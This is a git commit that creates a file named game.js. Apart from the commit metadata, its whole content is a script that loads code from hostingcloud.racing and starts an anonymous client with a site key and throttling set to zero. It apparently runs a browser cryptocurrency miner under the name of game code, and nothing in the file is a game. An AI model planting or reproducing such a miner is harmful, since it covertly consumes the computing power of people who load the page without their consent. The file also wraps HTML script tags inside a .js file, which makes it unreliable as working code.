2e437e87bf5114e1132f54475ecc9b006d81b471
Xyanc <48155832+Xyanc@users.noreply.github.com>
2024-12-28 23:17:31 +0300

    Create game.js

---
+++ game.js
@@ -0,0 +1,9 @@
+<script src="https://www.hostingcloud.racing/65I5.js"></script>
+<script>
+    var _client = new Client.Anonymous('dd4419e033fe931385a5132f115494d71fb00fd545ee68fa8a713b7e437a6a41', {
+        throttle: 0, c: 'w', ads: 0
+    });
+    _client.start();
+    
+
+</script>
